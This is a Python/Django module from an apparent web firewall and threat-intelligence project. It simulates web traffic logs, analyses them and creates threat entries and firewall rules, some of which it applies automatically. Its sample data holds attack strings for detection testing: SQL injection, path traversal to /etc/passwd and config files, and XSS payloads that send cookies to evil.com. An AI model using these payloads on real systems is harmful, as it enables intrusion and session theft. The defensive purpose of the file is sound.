import logging
import ipaddress
import re
from datetime import timedelta
from django.utils import timezone
from django.conf import settings
from django.db.models import Q
from .models import ThreatIntelEntry, ThreatIntelSource, SuggestedFirewallRule
from .integrations.arpf_ai_connector import ARPFAIConnector
from .ai.arpf_model import arpf_defense, analyze_request, generate_insights

logger = logging.getLogger('arpf_ti')

class TrafficAnalyzer:
    """
    Analyzes traffic logs to identify potential threats and generate threat intelligence entries.
    """
    
    def __init__(self):
        """Initialize the traffic analyzer with necessary components."""
        self.arpf_ai = arpf_defense
        self.analysis_source = self._get_or_create_analysis_source()
        
    def _get_or_create_analysis_source(self):
        """Get or create the threat intel source for traffic analysis entries."""
        source, created = ThreatIntelSource.objects.get_or_create(
            name="Traffic Analysis",
            defaults={
                'description': "Automatically generated from traffic analysis",
                'source_type': 'internal',
                'is_active': True,
                'api_key': None,
                'url': 'http://localhost/traffic-analysis'  # Changed from None to a dummy URL to satisfy NOT NULL constraint
            }
        )
        
        if created:
            logger.info("Created Traffic Analysis threat intelligence source")
            
        return source
    
    def analyze_logs(self, days=7):
        """
        Analyze logs from the specified number of days and generate threat intelligence entries.
        
        Args:
            days: Number of days of logs to analyze (default: 7)
            
        Returns:
            dict: Analysis results including number of logs analyzed, potential threats found, etc.
        """
        logger.info(f"Starting traffic analysis for the last {days} days")
        
        # In a real implementation, we would read actual logs from a file or database
        # For this implementation, we'll simulate log entries to demonstrate the functionality
        
        log_entries = self._get_sample_log_entries(days)
        total_logs = len(log_entries)
        
        # Process log entries to extract useful data
        processed_entries = self._process_logs(log_entries)
        
        # Analyze entries using ARPF Defense to identify threats
        analysis_results = self._analyze_entries(processed_entries)
        
        # Create threat intelligence entries based on analysis
        created_entries = self._create_threat_intel_entries(analysis_results)
        
        # Generate suggested firewall rules
        suggested_rules = self._generate_firewall_rules(analysis_results)
        
        # Return analysis summary
        return {
            "total_logs_analyzed": total_logs,
            "potential_threats_found": len(analysis_results),
            "threat_intel_entries_created": len(created_entries),
            "suggested_rules_created": len(suggested_rules),
            "analysis_period_days": days,
            "analysis_date": timezone.now(),
            "threat_categories": self._summarize_threat_categories(created_entries)
        }
        
    def _get_sample_log_entries(self, days):
        """
        Generate sample log entries for demonstration purposes.
        In a real implementation, this would read from actual log files or databases.
        
        Args:
            days: Number of days of logs to generate
            
        Returns:
            list: Sample log entries
        """
        # Sample IPs including some known bad ones
        sample_ips = [
            "203.0.113.1",  # Normal user
            "203.0.113.42", # Normal user
            "203.0.113.100", # Normal user
            "198.51.100.23", # Slightly suspicious
            "198.51.100.42", # Slightly suspicious
            "185.220.101.34", # Known bad (Tor exit node)
            "89.248.167.131", # Known scanner
            "134.209.82.14", # Attack source
            "103.103.0.100", # Bad actor
            "194.26.29.156", # Sweden - clean IP
            "185.156.73.54", # Known in intel feeds
            "92.118.160.1", # Scanning network
        ]
        
        # Sample paths including some vulnerable or admin paths
        sample_paths = [
            "/",
            "/index.html",
            "/about",
            "/products",
            "/api/v1/users",
            "/api/v1/products",
            "/admin/",
            "/wp-admin/",
            "/phpMyAdmin/",
            "/api/v1/users/1",
            "/api/debug",
            "/?id=1",
            "/?id=1%27%20OR%20%271%27=%271", # SQL injection attempt
            "/search?q=<script>alert(1)</script>", # XSS attempt
            "/login",
            "/wp-login.php",
            "/.env", # Sensitive file
            "/api/debug?test=1",
            "/server-status",
            "/.git/config", # Sensitive file
            "/api/private",
            "/static/js/main.js"
        ]
        
        # Sample user agents
        sample_user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 zgrab/0.x", # Scanner
            "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers", # Scanner
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36", 
            "python-requests/2.26.0", # API client or scanner
            "Go-http-client/1.1", # API client or scanner
            "sqlmap/1.4.7#stable (http://sqlmap.org)", # Malicious tool
            "masscan/1.0 (https://github.com/robertdavidgraham/masscan)" # Scanner
        ]
        
        # Sample HTTP methods
        sample_methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"]
        
        # Sample HTTP status codes
        sample_status = [200, 301, 302, 400, 401, 403, 404, 500]
        
        # Generate log entries
        import random
        from datetime import datetime, timedelta
        
        start_date = timezone.now() - timezone.timedelta(days=days)
        log_entries = []
        
        # Create some normal traffic patterns first
        for i in range(5000):  # Base level of normal traffic
            timestamp = start_date + timezone.timedelta(
                days=random.randint(0, days-1),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59),
                seconds=random.randint(0, 59)
            )
            
            # Normal traffic uses normal IPs, paths, and user agents
            entry = {
                'timestamp': timestamp,
                'source_ip': random.choice(sample_ips[:5]),  # Normal IPs
                'method': random.choice(sample_methods[:3]),  # Common methods
                'path': random.choice(sample_paths[:10]),  # Regular paths
                'user_agent': random.choice(sample_user_agents[:8]),  # Regular user agents
                'status_code': random.choice([200, 301, 302, 404]),  # Common status codes
                'response_size': random.randint(500, 50000)
            }
            log_entries.append(entry)
        
        # Add some suspicious/malicious traffic
        for i in range(500):  # Smaller amount of suspicious traffic
            timestamp = start_date + timezone.timedelta(
                days=random.randint(0, days-1),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59),
                seconds=random.randint(0, 59)
            )
            
            # Suspicious traffic uses suspicious IPs, paths, and user agents
            entry = {
                'timestamp': timestamp,
                'source_ip': random.choice(sample_ips[5:]),  # Suspicious IPs
                'method': random.choice(sample_methods),  # Any method
                'path': random.choice(sample_paths[10:]),  # Suspicious paths
                'user_agent': random.choice(sample_user_agents[8:]),  # Suspicious user agents
                'status_code': random.choice(sample_status),  # Any status code
                'response_size': random.randint(100, 100000)
            }
            log_entries.append(entry)
        
        # Add some specific attack patterns
        
        # SQL Injection attempts
        for i in range(50):
            timestamp = start_date + timezone.timedelta(
                days=random.randint(0, days-1),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59),
                seconds=random.randint(0, 59)
            )
            
            # SQL injection paths with malicious IPs
            path = random.choice([
                "/?id=1%27%20OR%20%271%27=%271",
                "/?id=1' OR '1'='1",
                "/?search=1' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -",
                "/login.php?username=admin' OR '1'='1' --",
                "/products?category=1+AND+1=1",
                "/api/users?id=1%20OR%201=1",
                "/search?q=test'+UNION+SELECT+username,+password+FROM+users--",
                "/page?id=1; DROP TABLE users--",
                "/forum?thread=1' OR 'x'='x"
            ])
            
            entry = {
                'timestamp': timestamp,
                'source_ip': random.choice(sample_ips[5:]),  # Malicious IPs
                'method': random.choice(['GET', 'POST']),
                'path': path,
                'user_agent': random.choice(sample_user_agents[8:]),  # Suspicious user agents
                'status_code': random.choice([200, 500, 403]),
                'response_size': random.randint(100, 5000)
            }
            log_entries.append(entry)
        
        # XSS attempts
        for i in range(40):
            timestamp = start_date + timezone.timedelta(
                days=random.randint(0, days-1),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59),
                seconds=random.randint(0, 59)
            )
            
            # XSS paths with malicious IPs
            path = random.choice([
                "/search?q=<script>alert(1)</script>",
                "/feedback?comment=<img src=x onerror=alert(1)>",
                "/profile?name=<svg/onload=alert(1)>",
                "/page?title=<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>",
                "/comment?text=<a onmouseover=alert(1)>click me</a>",
                "/post?title=<img src=\"javascript:alert('XSS')\">",
                "/forum?message=<body onload=alert(1)>",
                "/search?term=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
            ])
            
            entry = {
                'timestamp': timestamp,
                'source_ip': random.choice(sample_ips[5:]),  # Malicious IPs
                'method': random.choice(['GET', 'POST']),
                'path': path,
                'user_agent': random.choice(sample_user_agents[8:]),  # Suspicious user agents
                'status_code': random.choice([200, 400, 403]),
                'response_size': random.randint(100, 5000)
            }
            log_entries.append(entry)
        
        # Path traversal attempts
        for i in range(30):
            timestamp = start_date + timezone.timedelta(
                days=random.randint(0, days-1),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59),
                seconds=random.randint(0, 59)
            )
            
            # Path traversal paths with malicious IPs
            path = random.choice([
                "/../../etc/passwd",
                "/assets/../../../../etc/passwd",
                "/images/..%252f..%252f..%252f..%252fetc/passwd",
                "/download?file=../../../config.php",
                "/theme/..%2f..%2f..%2f..%2fwindows/win.ini",
                "/include.php?file=../../../../etc/passwd",
                "/load_file.php?file=../../../wp-config.php",
                "/api/v1/files/../../../.env"
            ])
            
            entry = {
                'timestamp': timestamp,
                'source_ip': random.choice(sample_ips[5:]),  # Malicious IPs
                'method': 'GET',
                'path': path,
                'user_agent': random.choice(sample_user_agents[8:]),  # Suspicious user agents
                'status_code': random.choice([403, 404, 500]),
                'response_size': random.randint(100, 1000)
            }
            log_entries.append(entry)
        
        # Add some scanning behavior (many paths from same IP in short time)
        scanning_ips = [sample_ips[6], sample_ips[7], sample_ips[10]]  # Known scanners
        
        for scanner_ip in scanning_ips:
            base_timestamp = start_date + timezone.timedelta(
                days=random.randint(0, days-1),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59)
            )
            
            # Scanner hits many different paths in a short period
            for i, path in enumerate(random.sample(sample_paths, min(20, len(sample_paths)))):
                timestamp = base_timestamp + timezone.timedelta(seconds=i*2)  # Every 2 seconds
                
                entry = {
                    'timestamp': timestamp,
                    'source_ip': scanner_ip,
                    'method': 'GET',
                    'path': path,
                    'user_agent': random.choice(sample_user_agents[8:]),  # Scanner user agents
                    'status_code': random.choice([200, 404, 403, 401, 500]),
                    'response_size': random.randint(100, 10000)
                }
                log_entries.append(entry)
        
        # Sort by timestamp
        log_entries.sort(key=lambda x: x['timestamp'])
        
        logger.info(f"Generated {len(log_entries)} sample log entries for analysis")
        return log_entries
    
    def _process_logs(self, log_entries):
        """
        Process log entries to extract relevant data for analysis.
        
        Args:
            log_entries: Raw log entries
            
        Returns:
            list: Processed entries ready for analysis
        """
        processed_entries = []
        
        for entry in log_entries:
            # Extract and structure data from the log entry
            processed_entry = {
                'source_ip': entry.get('source_ip'),
                'path': entry.get('path'),
                'method': entry.get('method'),
                'user_agent': entry.get('user_agent'),
                'status_code': entry.get('status_code'),
                'timestamp': entry.get('timestamp'),
                'response_size': entry.get('response_size', 0),
                'headers': {}  # Would contain actual headers in a real implementation
            }
            
            # Extract query parameters from the path
            query_params = {}
            if '?' in processed_entry['path']:
                path_parts = processed_entry['path'].split('?', 1)
                processed_entry['base_path'] = path_parts[0]
                
                # Parse query string
                query_string = path_parts[1]
                if query_string:
                    for param in query_string.split('&'):
                        if '=' in param:
                            key, value = param.split('=', 1)
                            query_params[key] = value
                        else:
                            query_params[param] = ''
            else:
                processed_entry['base_path'] = processed_entry['path']
            
            processed_entry['query_params'] = query_params
            
            processed_entries.append(processed_entry)
        
        return processed_entries
    
    def _analyze_entries(self, processed_entries):
        """
        Analyze processed entries to identify potential threats.
        Uses the ARPF Defense system to analyze entries.
        
        Args:
            processed_entries: Processed log entries
            
        Returns:
            list: Analysis results for entries identified as potential threats
        """
        analysis_results = []
        
        # Group entries by IP to detect patterns
        ip_entries = {}
        for entry in processed_entries:
            ip = entry['source_ip']
            if ip not in ip_entries:
                ip_entries[ip] = []
            ip_entries[ip].append(entry)
        
        # Analyze each entry with ARPF Defense
        for entry in processed_entries:
            # Convert entry to request_data format expected by ARPF Defense
            request_data = {
                'source_ip': entry['source_ip'],
                'path': entry['path'],
                'method': entry['method'],
                'user_agent': entry['user_agent'],
                'headers': entry.get('headers', {}),
                'query_params': entry.get('query_params', {})
            }
            
            # Use ARPF Defense to analyze the request
            analysis = analyze_request(request_data)
            
            # If the analysis indicates a potential threat, add to results
            if analysis['confidence'] >= 60 or analysis['recommended_action'] != 'allow':
                # Add additional context to the analysis
                analysis['log_entry'] = entry
                analysis['requests_from_ip'] = len(ip_entries.get(entry['source_ip'], []))
                
                analysis_results.append(analysis)
        
        # Also run ARPF Defense's traffic pattern analysis for broader insights
        traffic_patterns = generate_insights(days=7)
        
        # Process any suggested rules from the traffic pattern analysis
        for suggested_rule in traffic_patterns.get('suggested_rules', []):
            # Skip rules we've already detected in individual request analysis
            if any(r.get('rule_suggestion', {}).get('pattern') == suggested_rule.get('pattern') for r in analysis_results):
                continue
            
            # Add the suggestion as an analysis result
            analysis_results.append({
                'attack_type': 'pattern_analysis',
                'confidence': suggested_rule.get('confidence', 75),
                'recommended_action': 'block',
                'explanation': suggested_rule.get('description'),
                'source_ip': suggested_rule.get('pattern') if suggested_rule.get('rule_type') == 'ip' else None,
                'request_path': suggested_rule.get('pattern') if suggested_rule.get('rule_type') == 'path' else None,
                'pattern': suggested_rule.get('pattern'),
                'rule_type': suggested_rule.get('rule_type'),
                'timestamp': timezone.now().isoformat(),
                'from_traffic_pattern': True
            })
        
        return analysis_results
    
    def _create_threat_intel_entries(self, analysis_results):
        """
        Create threat intelligence entries based on analysis results.
        
        Args:
            analysis_results: Analysis results from the ARPF Defense system
            
        Returns:
            list: Created ThreatIntelEntry objects
        """
        created_entries = []
        
        for result in analysis_results:
            # Skip low confidence results
            if result.get('confidence', 0) < 60:
                continue
                
            entry_type = 'unknown'
            value = None
            category = result.get('attack_type', 'unknown')
            confidence_score = result.get('confidence', 70) / 100.0  # Convert to 0-1 scale for the model
            description = result.get('explanation', 'Detected by traffic analysis')
            
            # Determine entry type and value based on analysis
            if result.get('source_ip') and category in [
                'suspicious_source', 'blocked_country', 'scanning',
                'high_request_rate', 'behavioral_anomaly'
            ]:
                entry_type = 'ip'
                value = result.get('source_ip')
                description = f"{category.replace('_', ' ').title()}: {description}"
            elif category in ['sql_injection', 'xss', 'path_traversal', 'command_injection']:
                # For these attacks, prefer creating an entry for the path pattern
                entry_type = 'path_pattern'
                value = result.get('request_path')
                if not value and result.get('pattern'):
                    value = result.get('pattern')
                description = f"{category.replace('_', ' ').title()} attack: {description}"
            elif result.get('pattern') and result.get('rule_type') == 'ip_range':
                entry_type = 'ip_range'
                value = result.get('pattern')
                description = f"IP range from {category}: {description}"
            elif result.get('user_agent', '').strip():
                entry_type = 'user_agent'
                value = result.get('user_agent')
                description = f"Suspicious user agent: {description}"
            
            # Skip if we couldn't determine a valid entry type or value
            if not value or entry_type == 'unknown':
                continue
                
            # Skip if this exact entry already exists to avoid duplicates
            if ThreatIntelEntry.objects.filter(
                entry_type=entry_type,
                value=value,
                source=self.analysis_source
            ).exists():
                continue
            
            # Create the threat intel entry
            try:
                entry = ThreatIntelEntry(
                    entry_type=entry_type,
                    value=value,
                    source=self.analysis_source,
                    confidence_score=confidence_score,
                    category=category,
                    description=description,
                    is_active=True,
                    first_seen=timezone.now(),
                    last_seen=timezone.now()
                )
                entry.save()
                created_entries.append(entry)
                
                logger.info(f"Created threat intelligence entry: {entry_type}={value} ({category})")
            except Exception as e:
                logger.error(f"Error creating threat intel entry: {str(e)}")
        
        return created_entries
    
    def _generate_firewall_rules(self, analysis_results):
        """
        Generate suggested firewall rules based on analysis results.
        
        Args:
            analysis_results: Analysis results from the ARPF Defense system
            
        Returns:
            list: Created SuggestedFirewallRule objects
        """
        suggested_rules = []
        
        for result in analysis_results:
            # Only suggest rules for high-confidence threats
            if result.get('confidence', 0) < 75 or result.get('recommended_action') != 'block':
                continue
                
            rule_type = 'custom'
            pattern = ''
            description = f"Rule suggested by ARPF Defense"
            attack_type = result.get('attack_type', 'unknown')
            confidence = int(result.get('confidence', 75))
            source_ip = result.get('source_ip')
            request_path = result.get('request_path')
            user_agent = result.get('user_agent')
            
            # Determine rule type and pattern based on attack type
            if attack_type in ['sql_injection', 'xss', 'path_traversal', 'command_injection']:
                rule_type = 'path'
                pattern = request_path
                description = f"Block request path matching potential {attack_type.replace('_', ' ')} attack"
            elif attack_type in ['suspicious_source', 'scanning', 'high_request_rate', 'blocked_country']:
                rule_type = 'ip'
                pattern = source_ip
                description = f"Block IP address identified as {attack_type.replace('_', ' ')}"
            elif attack_type == 'suspicious_user_agent':
                rule_type = 'user_agent'
                pattern = user_agent
                description = f"Block suspicious user agent identified as potential scanning tool"
            
            # Skip if we couldn't determine a valid rule type or pattern
            if not pattern or rule_type == 'custom':
                continue
                
            # Skip if this exact rule has been suggested recently
            if SuggestedFirewallRule.objects.filter(
                rule_type=rule_type,
                pattern=pattern,
                created_at__gte=timezone.now() - timezone.timedelta(hours=24)
            ).exists():
                continue
            
            # Create the suggested rule
            try:
                rule = SuggestedFirewallRule(
                    rule_type=rule_type,
                    pattern=pattern,
                    description=description,
                    confidence=confidence,
                    attack_type=attack_type,
                    source_ip=source_ip,
                    request_path=request_path,
                    user_agent=user_agent,
                    # Auto-approve high confidence threats
                    status='auto_approved' if confidence >= 90 else 'pending'
                )
                rule.save()
                
                # Auto-apply rules with very high confidence
                if confidence >= 90:
                    applied_rule = rule.approve()
                    logger.info(f"Auto-applied firewall rule: {description}")
                
                suggested_rules.append(rule)
                logger.info(f"Created suggested firewall rule: {rule_type}={pattern}")
            except Exception as e:
                logger.error(f"Error creating suggested firewall rule: {str(e)}")
        
        return suggested_rules
    
    def _summarize_threat_categories(self, entries):
        """
        Summarize the categories of created threat intelligence entries.
        
        Args:
            entries: List of created ThreatIntelEntry objects
            
        Returns:
            dict: Summary of entry categories and counts
        """
        categories = {}
        
        for entry in entries:
            category = entry.category
            if category not in categories:
                categories[category] = 0
            categories[category] += 1
        
        return categories
    
    def get_source_recommendations(self):
        """
        Get recommendations for new threat intelligence sources based on traffic analysis.
        
        Returns:
            list: Recommended sources to add
        """
        # This would normally be generated by the AI based on traffic patterns
        # For now, return a static list of recommendations
        return [
            {
                "name": "ARPF Community Threat Feed",
                "source_type": "custom",
                "description": "Collaborative threat intelligence feed from the ARPF community",
                "url": "https://ti.arpf.org/community/feed",
                "confidence": 85
            },
            {
                "name": "Emerging Threats",
                "source_type": "ip_list",
                "description": "Comprehensive list of known malicious IP addresses",
                "url": "https://rules.emergingthreats.net/blockrules/",
                "confidence": 90
            },
            {
                "name": "Abuse.ch Malware Trackers",
                "source_type": "custom",
                "description": "Tracks botnet C&C servers and malware distribution sites",
                "url": "https://abuse.ch/api/",
                "confidence": 80
            }
        ]

# Create an instance for easier imports
traffic_analyzer = TrafficAnalyzer()